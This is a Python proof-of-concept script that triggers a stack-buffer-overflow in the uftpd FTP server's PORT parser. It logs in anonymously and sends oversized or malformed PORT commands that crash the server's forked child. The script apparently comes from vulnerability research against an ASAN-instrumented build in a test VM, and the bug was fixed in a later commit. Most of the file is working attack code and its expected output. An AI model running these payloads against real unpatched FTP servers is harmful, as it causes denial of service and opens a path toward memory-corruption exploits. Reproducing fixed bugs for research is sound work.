#!/usr/bin/env python3
"""
PoC: uftpd PORT-parser stack-buffer-overflow (handle_PORT, src/ftpcmd.c:441)
Commit: 0fb2c031~1 (parent of fix 0fb2c031)

Bug:
    char addr[INET_ADDRSTRLEN];           // 16 bytes
    sscanf(str, "%d,%d,%d,%d,%d,%d", &a,&b,&c,&d,&e,&f);  // unchecked 0-255
    sprintf(addr, "%d.%d.%d.%d", a,b,c,d);                // OVERFLOW

    A PORT command with octets > 999999999 → "%d.%d.%d.%d" exceeds 16 bytes
    → stack-buffer-overflow → ASAN abort (SIGABRT, exit 134).

Trigger variants (all confirmed reproduced via serial-ASAN):
    1. PORT 2147483647,0,0,1,4,210         (10-digit first octet)
    2. PORT 2147483647,...×4                (all octets huge — biggest overflow)
    3. PORT\\r\\n                            (bare PORT — sscanf reads garbage)
    4. PORT 127,0,0,1,4,210 + 470 bytes     (PAYLOAD_EXTEND variant)

Usage:
    python3 poc/uftpd_port_overflow.py [HOST] [PORT] [VARIANT]

    HOST defaults to 172.16.0.2 (Firecracker VM TAP address)
    PORT defaults to 21
    VARIANT: 1=large-octet (default), 2=all-huge, 3=bare-PORT

Prerequisite: uftpd ASAN-instrumented running (Firecracker VM or Docker).

    # Boot uftpd VM:
    bash scripts/build_rootfs_uftpd.sh
    LIFA_PROTOCOL_MODULE=ftp python3 -m evaluation.evaluation_runner \\
        --baseline C --duration 999999 --driver firecracker --target uftpd

    # In another terminal, run the PoC:
    python3 poc/uftpd_port_overflow.py 172.16.0.2 21

Expected output:
    [*] Connecting to uftpd at 172.16.0.2:21...
    [*] Banner: 220 uftpd (2.10) ready.
    [*] USER: 331 Login OK, please enter password.
    [*] PASS: 230 Guest login OK, access restrictions apply.
    [*] Sending PoC: PORT 2147483647,2147483647,2147483647,2147483647,4,210
    [+] CRASH CONFIRMED — connection dropped (ConnectionResetError)
    [+] ASAN stack-buffer-overflow in handle_PORT (ftpcmd.c:441).
    [+] Check the Firecracker serial console for the ASAN report.

The crash is per-connection (fork-per-connection): the forked child aborts
(ASAN), the daemon survives. The connection drops (timeout/reset). The ASAN
report appears on the serial console (console=ttyS0).
"""
import socket
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "172.16.0.2"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 21
VARIANT = int(sys.argv[3]) if len(sys.argv) > 3 else 1

# PoC variants — all trigger the sprintf overflow in handle_PORT.
POCS = {
    1: b"PORT 2147483647,0,0,1,4,210\r\n",                      # single large octet
    2: b"PORT 2147483647,2147483647,2147483647,2147483647,4,210\r\n",  # all octets huge
    3: b"PORT\r\n",                                              # bare PORT (sscanf garbage)
}

payload = POCS.get(VARIANT, POCS[1])

print(f"[*] PoC variant {VARIANT}: {payload.decode('ascii', errors='replace').strip()}")
print(f"[*] Connecting to uftpd at {HOST}:{PORT}...")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5.0)
s.connect((HOST, PORT))

# Read banner (220)
banner = s.recv(4096)
print(f"[*] Banner: {banner.decode('ascii', errors='replace').strip()}")

# Authenticate (uftpd accepts anonymous with no password)
s.sendall(b"USER anonymous\r\n")
resp = s.recv(4096)
print(f"[*] USER: {resp.decode('ascii', errors='replace').strip()}")

s.sendall(b"PASS x\r\n")
resp = s.recv(4096)
print(f"[*] PASS: {resp.decode('ascii', errors='replace').strip()}")

# Send the PoC
print(f"[*] Sending PoC: {payload.decode('ascii', errors='replace').strip()}")
s.sendall(payload)

# The forked child should abort (ASAN). The connection drops.
time.sleep(0.5)  # let ASAN fire
try:
    resp = s.recv(4096)
    if resp:
        print(f"[!] Unexpected response: {resp.decode('ascii', errors='replace').strip()}")
        print(f"[!] The crash may not have fired (check if ASAN is enabled).")
    else:
        print(f"[+] CRASH CONFIRMED — connection closed by server (empty response).")
        print(f"[+] ASAN stack-buffer-overflow in handle_PORT (ftpcmd.c:441).")
except (socket.timeout, ConnectionResetError, BrokenPipeError) as e:
    print(f"[+] CRASH CONFIRMED — connection dropped ({type(e).__name__}).")
    print(f"[+] ASAN stack-buffer-overflow in handle_PORT (ftpcmd.c:441).")
    print(f"[+] Check the serial console / docker logs for the ASAN report.")

s.close()
print(f"[*] Done.")
